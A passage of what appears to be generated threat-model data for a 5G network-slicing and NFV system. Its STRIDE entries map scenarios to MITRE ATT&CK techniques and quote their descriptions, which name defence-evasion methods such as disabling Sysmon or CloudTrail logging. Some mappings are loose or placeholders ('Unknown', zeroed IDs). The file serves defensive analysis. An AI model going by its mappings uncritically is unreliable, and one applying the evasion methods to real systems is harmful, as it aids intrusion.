                    "Condition": "Valid if logging mechanisms are insufficient."
                },
                {
                    "Assumption": "Deployment environments are not isolated from production.",
                    "Role": "DevOps",
                    "Condition": "Valid if environments are not adequately segmented."
                }
            ],
            "Potential Impact": "Leads to unauthorized deployments, data integrity issues, and operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Orchestration Scripts",
                "Unauthorized Deployment",
                "NFVO"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "User denies orchestrating unauthorized changes to network slices.",
            "Assumptions": [
                {
                    "Assumption": "Audit trails are not comprehensive.",
                    "Role": "IT Auditor",
                    "Condition": "Valid if audit logs do not capture all activities."
                },
                {
                    "Assumption": "Access logs are easily alterable.",
                    "Role": "System Administrator",
                    "Condition": "Valid if logs are not protected against tampering."
                },
                {
                    "Assumption": "No real-time user activity monitoring.",
                    "Role": "Security Operations",
                    "Condition": "Valid if user actions are not tracked live."
                }
            ],
            "Potential Impact": "Results in difficulty proving actions, potential abuse of privileges, and accountability issues.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Unauthorized Changes",
                "Audit Trails",
                "Access Logs"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Compromised user denies involvement in a data breach incident.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms do not ensure non-repudiation.",
                    "Role": "IT Security",
                    "Condition": "Valid if logs can be denied or modified."
                },
                {
                    "Assumption": "Incident response lacks detailed user activity records.",
                    "Role": "Incident Response Team",
                    "Condition": "Valid if incident reports lack granular user actions."
                },
                {
                    "Assumption": "Multi-user environment without sufficient attribution controls.",
                    "Role": "System Admin",
                    "Condition": "Valid if user activities are not distinctly logged."
                }
            ],
            "Potential Impact": "Leads to challenges in incident investigation, difficulty in attributing actions, and accountability gaps.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Data Breach",
                "User Denial",
                "Incident Investigation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Operators claim they did not receive crucial alerts on network performance issues.",
            "Assumptions": [
                {
                    "Assumption": "Alerting system fails to log notifications.",
                    "Role": "Monitoring Team",
                    "Condition": "Valid if notification systems do not maintain logs."
                },
                {
                    "Assumption": "Lack of acknowledgment tracking for alerts.",
                    "Role": "System Administrator",
                    "Condition": "Valid if alerts acknowledgment is not enforced."
                },
                {
                    "Assumption": "Poor incident tracking.",
                    "Role": "Incident Management",
                    "Condition": "Valid if incidents are not documented rigorously."
                }
            ],
            "Potential Impact": "Results in unresolved performance issues, operational inefficiencies, and potential downtime.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Network Performance",
                "Alert System",
                "Notification Logs"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data leak from VNFs due to unsecured communication channels.",
            "Assumptions": [
                {
                    "Assumption": "Communication between VNFs and orchestrator not encrypted.",
                    "Role": "Network Security",
                    "Condition": "Valid if encryption protocols are not enforced."
                },
                {
                    "Assumption": "Data leaks not monitored in transit.",
                    "Role": "Security Operations",
                    "Condition": "Valid if data loss prevention tools are not deployed."
                },
                {
                    "Assumption": "Sensitive data lack access controls.",
                    "Role": "Data Governance",
                    "Condition": "Valid if data access policies are weak."
                }
            ],
            "Potential Impact": "Leads to unauthorized data access, breaches of confidentiality, and regulatory non-compliance.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Data Leak",
                "Unsecured Communication",
                "Sensitive Data"
            ],
            "mitre_technique": {
                "name": "Network Device Configuration Dump",
                "description": "Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. ",
                "id": "attack-pattern--52759bf1-fe12-4052-ace6-c5b0cf7dd7fd",
                "technique_id": "T1602.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Malicious actor gains access to logs that contain sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Log files contain unredacted sensitive data.",
                    "Role": "System Administrator",
                    "Condition": "Valid if sensitive data is not masked in logs."
                },
                {
                    "Assumption": "Logs are not protected against unauthorized access.",
                    "Role": "Security Team",
                    "Condition": "Valid if log access controls are weak."
                },
                {
                    "Assumption": "No monitoring of log access.",
                    "Role": "IT Monitoring",
                    "Condition": "Valid if access to logs is not tracked."
                }
            ],
            "Potential Impact": "Results in exposure of confidential information and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Log Files",
                "Sensitive Information",
                "Unauthorized Access"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Cloud Logs",
                "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
                "id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
                "technique_id": "T1562.008"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Inadequate isolation between network slices leads to cross-slice data leakage.",
            "Assumptions": [
                {
                    "Assumption": "Network slices not properly isolated.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if isolation mechanisms are weak."
                },
                {
                    "Assumption": "Inter-slice communication not controlled.",
                    "Role": "Security Administrator",
                    "Condition": "Valid if communication policies are lax."
                },
                {
                    "Assumption": "Multiple tenants with varying trust levels share slices.",
                    "Role": "Service Provider",
                    "Condition": "Valid if different tenants are not adequately segregated."
                }
            ],
            "Potential Impact": "Leads to data confidentiality issues, unauthorized access, and potential compliance violations.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Cross-Slice Leakage",
                "Data Isolation",
                "Multiple Tenants"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack targets network slice interfaces, overwhelming resources.",
            "Assumptions": [
                {
                    "Assumption": "Interface is accessible over the public internet.",
                    "Role": "Attacker",
                    "Condition": "Valid if interface exposure is not limited."
                },
                {
                    "Assumption": "Lack of rate limiting on network slice interfaces.",
                    "Role": "Network Engineer",
                    "Condition": "Valid if rate limiting is not implemented."
                },
                {
                    "Assumption": "No DDoS mitigation strategy in place.",
                    "Role": "Security Operations",
                    "Condition": "Valid if anti-DDOS measures are not deployed."
                }
            ],
            "Potential Impact": "Leads to service disruption, resource depletion, and potential service unavailability.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "DDoS Attack",
                "Resource Overload",
                "Network Interfaces"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects VNFs causing high resource consumption, leading to service outages.",
            "Assumptions": [
                {
                    "Assumption": "VNFs are not adequately protected against malware.",
                    "Role": "Network Security",
                    "Condition": "Valid if anti-malware measures are insufficient."
                },
                {
                    "Assumption": "Resource usage monitoring is weak.",
                    "Role": "System Monitoring",
                    "Condition": "Valid if resource anomalies are not tracked."
                },
                {
                    "Assumption": "Isolation of VNFs is poor.",
                    "Role": "Infrastructure Team",
                    "Condition": "Valid if resource isolation is not enforced."
                }
            ],
            "Potential Impact": "Results in resource exhaustion, service degradation, and outages.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Malware Infection",
                "Resource Consumption",
                "Service Outages"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Edge computing nodes are overwhelmed with bogus processing requests.",
            "Assumptions": [
                {
                    "Assumption": "No rate limiting on processing requests at edge nodes.",
                    "Role": "Edge Computing Admin",
                    "Condition": "Valid if rate limiting controls are not in place."
                },
                {
                    "Assumption": "Insufficient filtering of incoming requests.",
                    "Role": "Network Security",
                    "Condition": "Valid if requests are not properly filtered."
                },
                {
                    "Assumption": "Monitoring and alerting systems are not robust.",
                    "Role": "IT Operations",
                    "Condition": "Valid if monitoring systems are inadequate."
                }
            ],
            "Potential Impact": "Leads to processing delays, resource exhaustion, and service interruptions.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Edge Computing",
                "Bogus Requests",
                "Processing Overload"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user escalates privileges to gain administrative access to NFVO.",
            "Assumptions": [
                {
                    "Assumption": "Weak access control policies.",
                    "Role": "Security Team",
                    "Condition": "Valid if access controls are lax."
                },
                {
                    "Assumption": "Insufficient segregation of duties.",
                    "Role": "Compliance Officer",
                    "Condition": "Valid if duties are not adequately segregated."
                },
                {
                    "Assumption": "Privilege escalation attempts not logged.",
                    "Role": "System Monitoring",
                    "Condition": "Valid if no logging of privilege changes."
                }
            ],
            "Potential Impact": "Leads to unauthorized administrative actions, potential system compromise, and security policy violation.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Administrative Access",
                "NFVO",
                "Weak Access Controls"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Compromised VNF allows attacker to gain higher-level permissions in the network.",
            "Assumptions": [
                {
                    "Assumption": "VNF lacks proper security hardening.",
                    "Role": "VNF Administrator",
                    "Condition": "Valid if hardening processes are weak."
                },
                {
                    "Assumption": "Inter-VNF communication is not restricted.",
                    "Role": "Network Security",
                    "Condition": "Valid if communication policies allow lateral movement."
                },
                {
                    "Assumption": "No oversight on VNF activities.",
                    "Role": "Security Operations",
                    "Condition": "Valid if VNF actions are not monitored."
                }
            ],
            "Potential Impact": "Results in broader network compromise, unauthorized access, and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "VNF",
                "Higher-level Permissions",
                "Network Compromise"
            ],
            "mitre_technique": {
                "name": "Abuse Elevation Control Mechanism",
                "description": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.(Citation: TechNet How UAC Works)(Citation: sudo man page 2018) An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.(Citation: OSX Keydnap malware)(Citation: Fortinet Fareit)",
                "id": "attack-pattern--67720091-eee3-4d2d-ae16-8264567f6f5b",
                "technique_id": "T1548"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting software vulnerabilities within edge nodes to escalate privileges.",
            "Assumptions": [
                {
                    "Assumption": "Edge nodes run unpatched software.",
                    "Role": "IT Operations",
                    "Condition": "Valid if patch management is poor."
                },
                {
                    "Assumption": "Vulnerability scanning not performed regularly.",
                    "Role": "Security Team",
                    "Condition": "Valid if scans are infrequent."
                },
                {
                    "Assumption": "Logging and alerting for edge nodes are insufficient.",
                    "Role": "System Monitoring",
                    "Condition": "Valid if real-time logging and alerting are weak."
                }
            ],
            "Potential Impact": "Leads to elevated access, potential intrusion, and compromise of edge resources.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Edge Nodes",
                "Software Vulnerabilities",
                "Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "21",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate network function (NF) to gain unauthorized access to the 5G core slicing system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the same network segment as the network functions.",
                    "Role": "Attacker",
                    "Condition": "Network segment compromise"
                },
                {
                    "Assumption": "The authentication mechanisms for network functions are weak or absent.",
                    "Role": "System Administrator",
                    "Condition": "Poor configuration or absence of security measures"
                },
                {
                    "Assumption": "Logging and monitoring of network functions are insufficient to detect spoofing attempts.",
                    "Role": "Network Security Team",
                    "Condition": "Lack of proper logging and monitoring"
                }
            ],
            "Potential Impact": "Unauthorized access leading to potential data breaches and network disruptions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network function",
                "network",
                "access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary spoofs an external partner interface to inject malicious commands or data into the 5G network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has knowledge of the external partner's configuration and protocols.",
                    "Role": "Attacker",
                    "Condition": "Prior reconnaissance or insider knowledge"
                },
                {
                    "Assumption": "There is no strong mutual authentication between the 5G system and external partners.",
                    "Role": "System Engineer",
                    "Condition": "Lack of mutual authentication implementation"
                },
                {
                    "Assumption": "Network traffic is not adequately encrypted, allowing for easier spoofing.",
                    "Role": "Network Administrator",
                    "Condition": "Unencrypted or poorly encrypted communication"
                }
            ],
            "Potential Impact": "Insertion of malicious data leading to potential system compromise and data integrity loss.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "external interface",
                "injection",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A compromised user device impersonates another legitimate device to gain access to sensitive network slices.",
            "Assumptions": [
                {
                    "Assumption": "User devices are not adequately secured and could be compromised.",
                    "Role": "User",
                    "Condition": "Insecure device configurations or unpatched vulnerabilities"
                },
                {
                    "Assumption": "The system does not enforce strict mutual authentication for device connections.",
                    "Role": "System Architect",
                    "Condition": "Lack of rigorous authentication protocols"
                },
                {
                    "Assumption": "Monitoring mechanisms are insufficient to detect and respond to device spoofing.",
                    "Role": "Security Operations",
                    "Condition": "Insufficient monitoring and incident response"
                }
            ],
            "Potential Impact": "Unauthorized device access leading to potential data breaches and service disruptions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "network slice",
                "access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An external attacker modifies the container images of Virtual Network Functions (VNFs) to include malicious code.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has gained access to the container image repository.",
                    "Role": "Attacker",
                    "Condition": "Compromise of container repository credentials"
                },
                {
                    "Assumption": "Repository lacks integrity checks and validation mechanisms.",
                    "Role": "DevOps Engineer",
                    "Condition": "Absence of robust integrity checks"
                },
                {
                    "Assumption": "CI/CD pipeline lacks sufficient security controls to detect tampered images.",
                    "Role": "System Integrator",
                    "Condition": "Weak CI/CD security practices"
                }
            ],
            "Potential Impact": "Infiltration of malicious code leading to data breaches, integrity loss, and potential service interruption.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "container",
                "image",
                "code injection"
            ],
            "mitre_technique": {
                "name": "Upload Malware",
                "description": "Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.\n\nMalware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.(Citation: Volexity Ocean Lotus November 2020)(Citation: Talos IPFS 2022)\n\nAdversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204). [Masquerading](https://attack.mitre.org/techniques/T1036) may increase the chance of users mistakenly executing these files.",
                "id": "attack-pattern--3ee16395-03f0-4690-a32e-69ce9ada0f9e",
                "technique_id": "T1608.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider with administrative privileges modifies the orchestration and management policies to prioritize unauthorized network slices.",
            "Assumptions": [
                {
                    "Assumption": "Insider has privileged access to orchestration and management tools.",
                    "Role": "Insider",
                    "Condition": "Administrative privileges"
                },
                {
                    "Assumption": "Change management processes are not adequately enforced or monitored.",
                    "Role": "System Administrator",
                    "Condition": "Weak change management practices"
                },
                {
                    "Assumption": "Audit logs are not comprehensive or regularly reviewed.",
                    "Role": "Security Audit",
                    "Condition": "Insufficient logging and review processes"
                }
            ],
            "Potential Impact": "Disruption of legitimate services, unauthorized data tampering, and manipulated resource allocation.",
